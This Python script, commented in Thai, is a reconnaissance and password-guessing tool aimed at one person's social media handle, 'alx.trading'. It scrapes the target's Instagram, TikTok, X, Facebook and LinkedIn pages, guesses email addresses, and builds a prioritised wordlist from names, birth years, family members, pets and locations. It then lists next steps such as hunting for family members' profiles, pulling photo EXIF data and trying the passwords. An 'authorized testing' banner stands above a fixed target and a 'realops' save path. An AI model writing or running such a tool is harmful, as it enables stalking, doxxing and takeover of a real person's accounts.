#!/usr/bin/env python3
"""
🕵️ DEEP OSINT & PERSONAL DATA HARVESTER 🕵️
=========================================

เจาะลึกหาข้อมูลส่วนตัวของ Alex (alx.trading) 
แบบขุดยันครอบครัว รากเหง้า!

- Social Media Intelligence
- Family Background Research  
- Personal Pattern Analysis
- Password Psychology Profiling

⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️
"""

import requests
import json
import re
import time
import random
from datetime import datetime
import urllib.parse
from bs4 import BeautifulSoup
import cloudscraper


class DeepOSINT:
    """OSINT แบบเจาะลึกถึงรากเหง้า"""

    def __init__(self, target_username="alx.trading"):
        self.target = target_username
        self.personal_data = {}
        self.family_data = {}
        self.password_patterns = []
        self.social_profiles = {}
        self.real_data = {}  # ข้อมูลจริงที่หาได้
        
        # สร้าง cloudscraper session
        self.scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
    def search_instagram_real_data(self):
        """ค้นหาข้อมูลจริงจาก Instagram"""
        print("📸 ค้นหาข้อมูลจริงจาก Instagram...")
        
        try:
            # ลองหา Instagram profile
            insta_url = f"https://www.instagram.com/{self.target}/"
            print(f"🔍 ตรวจสอบ: {insta_url}")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }
            
            response = self.scraper.get(insta_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print("✅ พบ Instagram Profile!")
                
                # ดึงข้อมูลจาก page source
                page_content = response.text
                
                # หา profile data
                profile_data = {}
                
                # ดึง bio/description
                bio_match = re.search(r'"biography":"([^"]*)"', page_content)
                if bio_match:
                    bio = bio_match.group(1)
                    profile_data['bio'] = bio
                    print(f"📝 Bio: {bio}")
                
                # ดึงชื่อเต็ม
                name_match = re.search(r'"full_name":"([^"]*)"', page_content)
                if name_match:
                    full_name = name_match.group(1)
                    profile_data['full_name'] = full_name
                    print(f"👤 Full Name: {full_name}")
                
                # ดึงจำนวน followers/following
                followers_match = re.search(r'"edge_followed_by":{"count":(\d+)}', page_content)
                if followers_match:
                    followers = followers_match.group(1)
                    profile_data['followers'] = followers
                    print(f"👥 Followers: {followers}")
                
                # ดึงข้อมูล posts
                posts_match = re.search(r'"edge_owner_to_timeline_media":{"count":(\d+)}', page_content)
                if posts_match:
                    posts_count = posts_match.group(1)
                    profile_data['posts_count'] = posts_count
                    print(f"📷 Posts: {posts_count}")
                
                # หาข้อมูลที่มีประโยชน์จาก bio
                if 'bio' in profile_data:
                    bio_text = profile_data['bio'].lower()
                    
                    # หาปี
                    years = re.findall(r'(19|20)\d{2}', bio_text)
                    if years:
                        profile_data['years_found'] = years
                        print(f"📅 Years found in bio: {years}")
                    
                    # หาชื่อ/คำสำคัญ
                    keywords = re.findall(r'\b[a-zA-Z]{3,}\b', bio_text)
                    if keywords:
                        profile_data['keywords'] = keywords[:10]  # เอาแค่ 10 คำแรก
                        print(f"🔑 Keywords: {keywords[:10]}")
                
                self.real_data['instagram'] = profile_data
                return profile_data
                
            else:
                print(f"❌ ไม่พบ Instagram Profile (Status: {response.status_code})")
                return None
                
        except Exception as e:
            print(f"⚠️ Error ค้นหา Instagram: {e}")
            return None

    def search_tiktok_real_data(self):
        """ค้นหาข้อมูลจริงจาก TikTok"""
        print("🎵 ค้นหาข้อมูลจริงจาก TikTok...")
        
        try:
            tiktok_url = f"https://www.tiktok.com/@{self.target}"
            print(f"🔍 ตรวจสอบ: {tiktok_url}")
            
            response = self.scraper.get(tiktok_url, timeout=10)
            
            if response.status_code == 200 and "user-not-found" not in response.text:
                print("✅ พบ TikTok Profile!")
                
                # ดึงข้อมูลจาก TikTok
                tiktok_data = {}
                page_content = response.text
                
                # หา display name
                name_match = re.search(r'"nickname":"([^"]*)"', page_content)
                if name_match:
                    nickname = name_match.group(1)
                    tiktok_data['nickname'] = nickname
                    print(f"👤 TikTok Name: {nickname}")
                
                # หา bio
                bio_match = re.search(r'"signature":"([^"]*)"', page_content)
                if bio_match:
                    bio = bio_match.group(1)
                    tiktok_data['bio'] = bio
                    print(f"📝 TikTok Bio: {bio}")
                
                self.real_data['tiktok'] = tiktok_data
                return tiktok_data
                
            else:
                print("❌ ไม่พบ TikTok Profile")
                return None
                
        except Exception as e:
            print(f"⚠️ Error ค้นหา TikTok: {e}")
            return None

    def search_twitter_real_data(self):
        """ค้นหาข้อมูลจริงจาก Twitter/X"""
        print("🐦 ค้นหาข้อมูลจริงจาก Twitter/X...")
        
        try:
            # ลองทั้ง twitter.com และ x.com
            urls = [
                f"https://twitter.com/{self.target}",
                f"https://x.com/{self.target}"
            ]
            
            for url in urls:
                print(f"🔍 ตรวจสอบ: {url}")
                
                response = self.scraper.get(url, timeout=10)
                
                if response.status_code == 200:
                    page_content = response.text
                    
                    # ตรวจสอบว่ามี profile จริงหรือไม่
                    if "This account doesn't exist" not in page_content and "User not found" not in page_content:
                        print("✅ พบ Twitter/X Profile!")
                        
                        twitter_data = {}
                        
                        # หา display name
                        name_matches = re.findall(r'"name":"([^"]*)"', page_content)
                        if name_matches:
                            twitter_data['display_names'] = list(set(name_matches))
                            print(f"👤 Twitter Names: {twitter_data['display_names']}")
                        
                        # หา bio/description
                        bio_matches = re.findall(r'"description":"([^"]*)"', page_content)
                        if bio_matches:
                            twitter_data['bios'] = list(set(bio_matches))
                            print(f"📝 Twitter Bios: {twitter_data['bios']}")
                        
                        self.real_data['twitter'] = twitter_data
                        return twitter_data
            
            print("❌ ไม่พบ Twitter/X Profile")
            return None
            
        except Exception as e:
            print(f"⚠️ Error ค้นหา Twitter: {e}")
            return None

    def search_facebook_real_data(self):
        """ค้นหาข้อมูลจริงจาก Facebook"""
        print("📘 ค้นหาข้อมูลจริงจาก Facebook...")
        
        try:
            # ลองหลาย URL pattern
            urls = [
                f"https://www.facebook.com/{self.target}",
                f"https://www.facebook.com/alex.trading",
                f"https://www.facebook.com/alextrading"
            ]
            
            for url in urls:
                print(f"🔍 ตรวจสอบ: {url}")
                
                response = self.scraper.get(url, timeout=10)
                
                if response.status_code == 200:
                    page_content = response.text
                    
                    # ตรวจสอบว่ามี profile
                    if "Page Not Found" not in page_content and "Content Not Found" not in page_content:
                        print("✅ อาจพบ Facebook Profile!")
                        
                        facebook_data = {'url': url, 'found': True}
                        self.real_data['facebook'] = facebook_data
                        return facebook_data
            
            print("❌ ไม่พบ Facebook Profile")
            return None
            
        except Exception as e:
            print(f"⚠️ Error ค้นหา Facebook: {e}")
            return None

    def search_linkedin_real_data(self):
        """ค้นหาข้อมูลจริงจาก LinkedIn"""
        print("💼 ค้นหาข้อมูลจริงจาก LinkedIn...")
        
        try:
            urls = [
                f"https://www.linkedin.com/in/{self.target}",
                f"https://www.linkedin.com/in/alex-trading",
                f"https://www.linkedin.com/in/alextrading"
            ]
            
            for url in urls:
                print(f"🔍 ตรวจสอบ: {url}")
                
                response = self.scraper.get(url, timeout=10)
                
                if response.status_code == 200:
                    page_content = response.text
                    
                    if "profile-not-found" not in page_content and "Page not found" not in page_content:
                        print("✅ อาจพบ LinkedIn Profile!")
                        
                        linkedin_data = {'url': url, 'found': True}
                        self.real_data['linkedin'] = linkedin_data
                        return linkedin_data
            
            print("❌ ไม่พบ LinkedIn Profile")
            return None
            
        except Exception as e:
            print(f"⚠️ Error ค้นหา LinkedIn: {e}")
            return None

    def extract_real_data_patterns(self):
        """สกัดข้อมูลจริงมาสร้าง password patterns"""
        print("🔍 สกัดข้อมูลจริงมาสร้าง Password Patterns...")
        
        real_passwords = []
        
        # วิเคราะห์ข้อมูลจาก Instagram
        if 'instagram' in self.real_data:
            insta = self.real_data['instagram']
            
            if 'full_name' in insta:
                name = insta['full_name'].lower().replace(' ', '')
                real_passwords.extend([
                    name,
                    f"{name}123",
                    f"{name}2024",
                    f"{name}2025"
                ])
            
            if 'bio' in insta:
                bio_words = re.findall(r'\b[a-zA-Z]+\b', insta['bio'].lower())
                for word in bio_words:
                    if len(word) > 3:
                        real_passwords.extend([
                            word,
                            f"{word}123",
                            f"alex{word}",
                            f"{word}alex"
                        ])
            
            if 'years_found' in insta:
                for year in insta['years_found']:
                    real_passwords.extend([
                        f"alex{year}",
                        f"trading{year}",
                        f"alx{year}"
                    ])
        
        # วิเคราะห์ข้อมูลจาก TikTok
        if 'tiktok' in self.real_data:
            tiktok = self.real_data['tiktok']
            
            if 'nickname' in tiktok:
                nickname = tiktok['nickname'].lower().replace(' ', '')
                real_passwords.extend([
                    nickname,
                    f"{nickname}123",
                    f"alex{nickname}"
                ])
        
        # วิเคราะห์ข้อมูลจาก Twitter
        if 'twitter' in self.real_data:
            twitter = self.real_data['twitter']
            
            if 'display_names' in twitter:
                for name in twitter['display_names']:
                    clean_name = name.lower().replace(' ', '')
                    real_passwords.extend([
                        clean_name,
                        f"{clean_name}123",
                        f"alex{clean_name}"
                    ])
        
        # ลบค่าซ้ำ
        real_passwords = list(set(real_passwords))
        
        print(f"🔑 สร้างได้ {len(real_passwords)} passwords จากข้อมูลจริง")
        
        return real_passwords

    def comprehensive_social_search(self):
        """ค้นหาข้อมูลจากทุก social platform"""
        print("🌐 เริ่มค้นหาข้อมูลจากทุก Social Platform...")
        print("=" * 60)
        
        # ค้นหาจากแต่ละ platform
        platforms_results = {}
        
        # Instagram
        insta_result = self.search_instagram_real_data()
        if insta_result:
            platforms_results['instagram'] = insta_result
        
        time.sleep(2)  # รอระหว่าง requests
        
        # TikTok
        tiktok_result = self.search_tiktok_real_data()
        if tiktok_result:
            platforms_results['tiktok'] = tiktok_result
        
        time.sleep(2)
        
        # Twitter/X
        twitter_result = self.search_twitter_real_data()
        if twitter_result:
            platforms_results['twitter'] = twitter_result
        
        time.sleep(2)
        
        # Facebook
        facebook_result = self.search_facebook_real_data()
        if facebook_result:
            platforms_results['facebook'] = facebook_result
        
        time.sleep(2)
        
        # LinkedIn
        linkedin_result = self.search_linkedin_real_data()
        if linkedin_result:
            platforms_results['linkedin'] = linkedin_result
        
        print("\n📊 สรุปผลการค้นหา Social Media:")
        print("=" * 60)
        for platform, data in platforms_results.items():
            print(f"✅ {platform.upper()}: พบข้อมูล")
        
        return platforms_results

    def extract_name_variations(self):
        """สกัดชื่อและการแปรผัน"""
        print("🔍 วิเคราะห์ชื่อและรูปแบบ...")

        base_names = {
            "alex": ["Alex", "ALEX", "alexander", "Alexandre", "Alejandro"],
            "alx": ["Alx", "ALX", "aleks", "alix"],
            "trading": ["Trading", "TRADING", "trader", "trade", "trd"]
        }

        # สร้างรูปแบบชื่อ
        name_patterns = []
        for alex_var in base_names["alex"]:
            for trading_var in base_names["trading"]:
                name_patterns.extend([
                    f"{alex_var}{trading_var}",
                    f"{alex_var}.{trading_var}",
                    f"{alex_var}_{trading_var}",
                    f"{alex_var}-{trading_var}",
                    f"{alex_var}@{trading_var}",
                ])

        self.personal_data["name_variations"] = name_patterns[:20]
        return name_patterns

    def social_media_reconnaissance(self):
        """ค้นหา social media profiles"""
        print("📱 ค้นหา Social Media Profiles...")

        platforms = {
            "facebook": [
                f"facebook.com/{self.target}",
                f"facebook.com/alex.trading",
                f"facebook.com/alextrading",
                f"facebook.com/alexander.trading"
            ],
            "linkedin": [
                f"linkedin.com/in/{self.target}",
                f"linkedin.com/in/alex-trading",
                f"linkedin.com/in/alexander-trading"
            ],
            "twitter": [
                f"twitter.com/{self.target}",
                f"twitter.com/alextrading",
                f"twitter.com/alex_trading"
            ],
            "tiktok": [
                f"tiktok.com/@{self.target}",
                f"tiktok.com/@alextrading"
            ],
            "youtube": [
                f"youtube.com/c/AlexTrading",
                f"youtube.com/@alextrading"
            ]
        }

        print("🎯 เป้าหมาย Social Media:")
        for platform, urls in platforms.items():
            print(f"\n📍 {platform.upper()}:")
            for url in urls:
                print(f"   🔗 https://{url}")

        self.social_profiles = platforms
        return platforms

    def generate_personal_passwords(self):
        """สร้างรหัสผ่านตาม personal data"""
        print("🔑 สร้างรหัสผ่านตามข้อมูลส่วนตัว...")

        # ข้อมูลส่วนตัวที่คาดเดา
        personal_info = {
            "possible_names": ["Alex", "Alexander", "Alexandre", "Alejandro"],
            "nicknames": ["Al", "Lex", "Ale", "Xander"],
            "birth_years": ["1990", "1991", "1992", "1993", "1994", "1995",
                            "1996", "1997", "1998", "1999", "2000"],
            "ages": ["30", "31", "32", "33", "34", "35"],
            "months": ["01", "02", "03", "04", "05", "06",
                       "07", "08", "09", "10", "11", "12"],
            "days": ["01", "15", "20", "25", "31"],
            "family_names": ["dad", "mom", "wife", "son", "daughter", "family"],
            "pets": ["dog", "cat", "max", "buddy", "charlie", "luna"],
            "hobbies": ["forex", "crypto", "bitcoin", "money", "rich", "wealth"]
        }

        personal_passwords = []

        # รูปแบบพื้นฐาน
        for name in personal_info["possible_names"]:
            for year in personal_info["birth_years"]:
                personal_passwords.extend([
                    f"{name.lower()}{year}",
                    f"{name}{year}",
                    f"{name.lower()}.trading{year[-2:]}",
                    f"{name.lower()}trader{year[-2:]}",
                    f"{name.lower()}{year[-2:]}",
                ])

        # วันเกิด patterns
        for name in ["alex", "Alex"]:
            for month in ["01", "06", "12"]:  # เดือนยอดนิยม
                for day in ["01", "15", "25"]:
                    for year in ["1995", "1990", "2000"]:
                        personal_passwords.extend([
                            f"{name}{day}{month}{year[-2:]}",
                            f"{name}{day}{month}{year}",
                            f"{name}{month}{day}{year[-2:]}",
                        ])

        # ครอบครัว patterns
        family_patterns = [
            "alexfamily123", "family123", "love123", "wife123",
            "alex&wife", "alexlove", "mywife123", "son123",
            "daughter123", "kids123", "baby123", "home123"
        ]
        personal_passwords.extend(family_patterns)

        # ธุรกิจ/การเงิน patterns
        business_patterns = [
            "money123", "rich123", "wealth123", "success123",
            "forex123", "crypto123", "bitcoin123", "profit123",
            "trading2023", "trading2024", "trader123",
            "business123", "invest123", "market123"
        ]
        personal_passwords.extend(business_patterns)

        # ลบค่าซ้ำ
        personal_passwords = list(set(personal_passwords))

        self.password_patterns = personal_passwords
        return personal_passwords

    def generate_family_passwords(self):
        """สร้างรหัสผ่านตามข้อมูลครอบครัว"""
        print("👨‍👩‍👧‍👦 สร้างรหัสผ่านตามครอบครัว...")

        # สมมติข้อมูลครอบครัวที่พบบ่อย
        family_scenarios = {
            "wife_names": ["anna", "maria", "sarah", "lisa", "kate", "emma"],
            "children_names": ["max", "leo", "mia", "zoe", "jack", "lily"],
            "family_years": ["2020", "2021", "2022", "2023", "2024"],
            "wedding_years": ["2018", "2019", "2020", "2021"],
            "anniversaries": ["0101", "0214", "0615", "1225"]  # วันแต่งงาน
        }

        family_passwords = []

        # รูปแบบครอบครัว
        for wife in family_scenarios["wife_names"]:
            family_passwords.extend([
                f"alex{wife}",
                f"Alex{wife}",
                f"alex&{wife}",
                f"alex{wife}123",
                f"alex{wife}2024",
                f"love{wife}",
                f"my{wife}",
            ])

        # ลูก
        for child in family_scenarios["children_names"]:
            family_passwords.extend([
                f"alex{child}",
                f"dad{child}",
                f"love{child}",
                f"my{child}",
                f"{child}dad",
                f"alex{child}123"
            ])

        # วันครบรอบ
        for year in family_scenarios["wedding_years"]:
            for date in family_scenarios["anniversaries"]:
                family_passwords.extend([
                    f"alex{date}{year[-2:]}",
                    f"love{date}{year[-2:]}",
                    f"wedding{date}",
                    f"anniversary{year[-2:]}"
                ])

        return family_passwords

    def generate_location_passwords(self):
        """สร้างรหัสผ่านตามสถานที่"""
        print("🌍 สร้างรหัสผ่านตามสถานที่...")

        # สถานที่ที่อาจเกี่ยวข้อง
        locations = {
            "countries": ["usa", "canada", "uk", "australia", "thailand"],
            "cities": ["london", "newyork", "toronto", "sydney", "bangkok"],
            "states": ["california", "texas", "florida", "newyork"],
            "abbreviations": ["ny", "ca", "tx", "fl", "usa", "uk"]
        }

        location_passwords = []

        for location_type, places in locations.items():
            for place in places:
                location_passwords.extend([
                    f"alex{place}",
                    f"alex{place}123",
                    f"trading{place}",
                    f"{place}alex",
                    f"{place}123",
                    f"from{place}",
                    f"live{place}"
                ])

        return location_passwords

    def search_email_patterns(self):
        """ค้นหารูปแบบ email"""
        print("📧 ค้นหารูปแบบ Email...")

        email_patterns = [
            f"{self.target}@gmail.com",
            f"alex.trading@gmail.com",
            f"alextrading@gmail.com",
            f"alexander.trading@gmail.com",
            f"alex@trading.com",
            f"contact@alextrading.com",
            f"alex.trader@gmail.com",
            f"a.trading@gmail.com",
            f"alx.trader@gmail.com"
        ]

        print("📧 เป้าหมาย Email addresses:")
        for email in email_patterns:
            print(f"   📮 {email}")

        return email_patterns

    def generate_comprehensive_wordlist(self):
        """สร้าง wordlist ครอบคลุมทุกด้าน - ใช้ข้อมูลจริง"""
        print("📋 สร้าง Comprehensive Wordlist จากข้อมูลจริง...")

        all_passwords = []

        # ดึงข้อมูลจริงจาก social media ก่อน
        print("🌐 ค้นหาข้อมูลจริงจาก Social Media...")
        self.comprehensive_social_search()
        
        # สร้างรหัสผ่านจากข้อมูลจริง
        real_data_passwords = self.extract_real_data_patterns()
        all_passwords.extend(real_data_passwords)
        
        print(f"✅ ได้รหัสผ่าน {len(real_data_passwords)} จากข้อมูลจริง")

        # รวมรหัสผ่านจากแหล่งอื่น (เป็น fallback)
        all_passwords.extend(self.generate_personal_passwords())
        all_passwords.extend(self.generate_family_passwords())
        all_passwords.extend(self.generate_location_passwords())

        # เพิ่มรูปแบบพิเศษจากข้อมูลจริง
        special_patterns = []
        
        # จาก Instagram data
        if 'instagram' in self.real_data:
            special_patterns.extend([
                "instagram123", "insta123", "ig123",
                f"{self.target}ig", f"{self.target}insta"
            ])
        
        # จาก TikTok data
        if 'tiktok' in self.real_data:
            special_patterns.extend([
                "tiktok123", "tt123", f"{self.target}tt"
            ])
            
        # Trading/Business related
        special_patterns.extend([
            # Crypto/Trading
            "blockchain123", "ethereum123", "btc123",
            "coinbase123", "binance123", "wallet123",
            "forex123", "trading2025", "crypto2025",

            # Business success
            "success2025", "profit2025", "rich2025",
            "millionaire", "entrepreneur", "ceo123"
        ])

        all_passwords.extend(special_patterns)

        # ลบค่าซ้ำและเรียง
        unique_passwords = list(set(all_passwords))
        unique_passwords.sort()

        return unique_passwords

    def save_intelligence_report(self, passwords):
        """บันทึกรายงาน Intelligence - รวมข้อมูลจริงจาก Social Media"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        # สร้าง summary ของข้อมูลจริงที่พบ
        real_data_summary = {}
        for platform, data in self.real_data.items():
            if isinstance(data, dict) and data:
                real_data_summary[platform] = {
                    "found": True,
                    "data_points": len(data),
                    "key_info": list(data.keys())
                }

        report = {
            "target": self.target,
            "generated_at": datetime.now().isoformat(),
            "intelligence_summary": {
                "total_passwords": len(passwords),
                "real_social_data_found": len(self.real_data),
                "platforms_discovered": list(self.real_data.keys()),
                "confidence_level": "High - Real Data Analysis"
            },
            "real_social_data": self.real_data,
            "real_data_summary": real_data_summary,
            "password_categories": {
                "real_social_data": "Extracted from actual social profiles",
                "personal_info": "Names, birthdays, ages",
                "family_data": "Wife, children, anniversaries",
                "location_based": "Cities, countries, states",
                "business_related": "Trading, finance, crypto"
            },
            "top_priority_passwords": passwords[:30],  # เพิ่มเป็น 30
            "social_profiles": self.social_profiles,
            "next_steps": [
                "Manual deep-dive on found social profiles",
                "Image EXIF data extraction",
                "Contact list analysis",
                "Family member profile hunting",
                "Advanced timeline correlation",
                "Cross-platform data validation"
            ]
        }

        # บันทึก JSON report
        report_file = f"/workspaces/sugarglitch-realops/deep_osint_report_{timestamp}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        # บันทึก password list แยกตาม priority
        password_file = f"/workspaces/sugarglitch-realops/deep_personal_passwords.txt"
        with open(password_file, 'w', encoding='utf-8') as f:
            f.write("# DEEP OSINT PASSWORD LIST - GENERATED FROM REAL SOCIAL DATA\n")
            f.write(f"# Target: {self.target}\n")
            f.write(f"# Generated: {datetime.now().isoformat()}\n")
            f.write(f"# Total Passwords: {len(passwords)}\n")
            f.write("# ========================================\n\n")
            
            # เขียน high-priority passwords ก่อน
            f.write("# TOP 30 HIGH PRIORITY (Real Data Based)\n")
            for i, pwd in enumerate(passwords[:30], 1):
                f.write(f"{pwd}\n")
            
            f.write("\n# ALL GENERATED PASSWORDS\n")
            for pwd in passwords:
                f.write(pwd + '\n')

        return report_file, password_file


def main():
    """Main OSINT function - ใช้ข้อมูลจริงจาก Social Media"""

    print("🕵️" * 20 + " DEEP REAL OSINT " + "🕵️" * 20)
    print("⚠️  REAL SOCIAL MEDIA DATA HARVESTING ⚠️")
    print("🎯 Target: alx.trading")
    print("🔍 Mode: REAL DATA - LIVE SOCIAL INTELLIGENCE")
    print("=" * 80)

    # สร้าง OSINT object
    osint = DeepOSINT("alx.trading")

    print("\n🌐 Phase 1: Live Social Media Intelligence Gathering")
    print("=" * 60)
    social_results = osint.comprehensive_social_search()

    print("\n� Phase 2: Real Data Pattern Analysis")
    real_passwords = osint.extract_real_data_patterns()

    print("\n📧 Phase 3: Email Pattern Discovery")
    osint.search_email_patterns()

    print("\n🔑 Phase 4: Comprehensive Password Generation (Real Data + Fallbacks)")
    passwords = osint.generate_comprehensive_wordlist()

    print(f"\n📊 REAL INTELLIGENCE SUMMARY:")
    print("=" * 50)
    print(f"🌐 Social Platforms Found: {len(osint.real_data)}")
    for platform in osint.real_data.keys():
        print(f"   ✅ {platform.upper()}")
    
    print(f"\n🔑 Password Statistics:")
    print(f"   � Total Generated: {len(passwords)}")
    print(f"   🎯 From Real Data: {len(real_passwords)}")
    print(f"   📋 Fallback/Predicted: {len(passwords) - len(real_passwords)}")

    print(f"\n🎯 TOP 30 HIGH-PRIORITY PASSWORDS (Real Data Based):")
    print("=" * 60)
    for i, pwd in enumerate(passwords[:30], 1):
        # แสดงว่ามาจากข้อมูลจริงหรือไม่
        source = "🔥 REAL" if pwd in real_passwords else "📝 PRED"
        print(f"   {i:2d}. {pwd:20} {source}")

    # แสดงข้อมูลจริงที่พบ
    if osint.real_data:
        print(f"\n🌐 DISCOVERED REAL SOCIAL DATA:")
        print("=" * 50)
        for platform, data in osint.real_data.items():
            print(f"\n📱 {platform.upper()}:")
            if isinstance(data, dict):
                for key, value in data.items():
                    if isinstance(value, str) and len(value) < 100:
                        print(f"   🔸 {key}: {value}")
                    elif isinstance(value, list):
                        print(f"   🔸 {key}: {', '.join(value[:3])}")

    # บันทึกรายงาน
    report_file, password_file = osint.save_intelligence_report(passwords)

    print(f"\n💾 Intelligence Report Saved:")
    print(f"   📄 Report: {report_file}")
    print(f"   🔑 Passwords: {password_file}")

    print(f"\n🎯 IMMEDIATE ACTIONS (Real Data Based):")
    print("=" * 60)
    print("1. � Test high-priority passwords from REAL data")
    print("2. �📱 Deep-dive manual check of found profiles")
    print("3. �️  Extract EXIF data from profile images")
    print("4. 👥 Hunt for family member profiles")
    print("5. 📧 Verify email patterns against real data")
    print("6. � Analyze posting patterns and timestamps")
    print("7. 🔄 Cross-reference data between platforms")

    if osint.real_data:
        print(f"\n� CRITICAL: Found real data on {len(osint.real_data)} platforms!")
        print("    Priority Level: 🚨 MAXIMUM - Use real data passwords first!")
    else:
        print("\n⚠️  No real social data found - using predicted patterns")

    print(f"\n🕵️ REAL OSINT COMPLETE - {len(passwords)} passwords ready!")
    return passwords, osint.real_data


if __name__ == "__main__":
    main()
